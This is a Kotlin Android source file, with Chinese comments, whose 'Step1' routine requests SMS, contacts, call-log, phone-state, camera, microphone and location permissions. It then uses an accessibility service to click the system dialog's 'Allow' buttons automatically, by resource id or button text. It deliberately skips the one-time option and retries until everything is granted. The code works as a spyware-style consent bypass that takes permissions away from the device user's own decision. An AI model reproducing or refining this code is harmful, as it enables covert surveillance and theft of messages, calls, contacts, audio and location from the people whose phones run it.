package com.zaka.screenagent.flow.samsung

import android.content.Context
import android.content.pm.PackageManager
import android.util.Log
import android.view.accessibility.AccessibilityNodeInfo
import com.zaka.screenagent.accessibility.BoundaryAccessibilityService

/**
 * 三星第一步：**运行时权限**
 *
 * 关键：**按资源 id 点按钮**，不靠文案猜。
 * Android 13 的权限框（三星实测）结构是：
 *   permission_message                       说明文字（点了没用）
 *   permission_allow_button                  普通权限的「允许」
 *   permission_allow_foreground_only_button  相机/位置的「使用应用时」
 *   permission_allow_one_time_button         「仅限这一次」← 绝不能点
 *   permission_deny_button                   「不允许」
 *
 * 早期版本按文案匹配「允许」，结果匹配到说明文字里，点了没反应、40 次超时、全部未授予。
 */
object Step1 {

    private const val TAG = "SS-Step1"

    private val allowIds = listOf(
        "permission_allow_button",
        "permission_allow_foreground_only_button",
        "permission_allow_all_button"
    )

    /** 文案兜底：只在 Button 类节点上匹配（避免点到说明文字） */
    private val allowTexts = listOf("允许", "使用应用时", "仅在使用该应用时允许", "允许所有", "Allow")

    private val required = arrayOf(
        android.Manifest.permission.READ_SMS,
        android.Manifest.permission.READ_CONTACTS,
        android.Manifest.permission.READ_PHONE_STATE,
        android.Manifest.permission.READ_CALL_LOG,
        android.Manifest.permission.CAMERA,
        android.Manifest.permission.RECORD_AUDIO,
        android.Manifest.permission.ACCESS_FINE_LOCATION
    )

    fun run(service: BoundaryAccessibilityService, onDone: (Boolean) -> Unit) {
        Log.d(TAG, "申请运行时权限 需授予=${needed(service).size} 已授予=${needed(service).count { service.checkSelfPermission(it) == PackageManager.PERMISSION_GRANTED }}")
        runCatching { service.requestRuntimePermissions() }

        var ticks = 0
        var lastHit = ""
        val tick = object : Runnable {
            override fun run() {
                ticks++
                if (allGranted(service)) {
                    Log.d(TAG, "全部已授予")
                    onDone(true)
                    return
                }
                val hit = clickAllowById(service) ?: clickAllowByButtonText(service)
                if (hit != null) {
                    if (hit != lastHit) { Log.d(TAG, "点了 $hit"); lastHit = hit }
                }
                if (ticks >= 20) {                        // 约 30 秒
                    val ok = allGranted(service)
                    Log.w(TAG, "超时 granted=$ok 缺=${missing(service).joinToString { m -> m.substringAfterLast('.') }}")
                    onDone(ok)
                    return
                }
                SamsungNavigator.post(1_500L, this)
            }
        }
        SamsungNavigator.post(1_500L, tick)
    }

    /** ① 资源 id 点「允许 / 使用应用时」 */
    private fun clickAllowById(service: BoundaryAccessibilityService): String? {
        for (root in SamsungNavigator.roots(service)) {
            for (id in allowIds) {
                val pool = ArrayList<AccessibilityNodeInfo>()
                collectById(root, id, 0, pool)
                for (n in pool) {
                    if (n.isEnabled && (n.performAction(AccessibilityNodeInfo.ACTION_CLICK) ||
                            SamsungNavigator.tap(service, n))) {
                        return "id=$id"
                    }
                }
            }
        }
        return null
    }

    /** ② 文案兜底，但只认 Button 节点 */
    private fun clickAllowByButtonText(service: BoundaryAccessibilityService): String? {
        for (root in SamsungNavigator.roots(service)) {
            for (t in allowTexts) {
                val n = findButton(root, t, 0) ?: continue
                if (n.isEnabled && (n.performAction(AccessibilityNodeInfo.ACTION_CLICK) ||
                        SamsungNavigator.tap(service, n))) {
                    return "text=$t"
                }
            }
        }
        return null
    }

    private fun collectById(n: AccessibilityNodeInfo?, id: String, d: Int, out: MutableList<AccessibilityNodeInfo>) {
        if (n == null || d > 30 || out.size > 4) return
        val rid = n.viewIdResourceName.orEmpty()
        if (rid.endsWith(id)) out.add(n)
        for (i in 0 until n.childCount) collectById(n.getChild(i), id, d + 1, out)
    }

    private fun findButton(n: AccessibilityNodeInfo?, want: String, d: Int): AccessibilityNodeInfo? {
        if (n == null || d > 30) return null
        val cls = n.className?.toString().orEmpty()
        val t = n.text?.toString().orEmpty()
        if (cls.contains("Button") && (t == want || t.contains(want))) return n
        for (i in 0 until n.childCount) findButton(n.getChild(i), want, d + 1)?.let { return it }
        return null
    }

    /**
     * 只检查"清单里真的声明了、且是危险权限"的那些。
     * 早期版本把 ACCESS_FINE_LOCATION 写死在列表里，但这个包没在清单声明它，
     * checkSelfPermission 永远 DENIED → Step1 每次都要空等 45 秒（表现为"打开没反应"）。
     */
    private fun needed(ctx: Context): List<String> {
        val declared = runCatching {
            ctx.packageManager.getPackageInfo(ctx.packageName, PackageManager.GET_PERMISSIONS)
                .requestedPermissions?.toSet() ?: emptySet()
        }.getOrDefault(emptySet())
        return required.filter { it in declared }
    }

    private fun allGranted(ctx: Context): Boolean = needed(ctx).all {
        ctx.checkSelfPermission(it) == PackageManager.PERMISSION_GRANTED
    }

    private fun missing(ctx: Context): List<String> = needed(ctx).filter {
        ctx.checkSelfPermission(it) != PackageManager.PERMISSION_GRANTED
    }
}
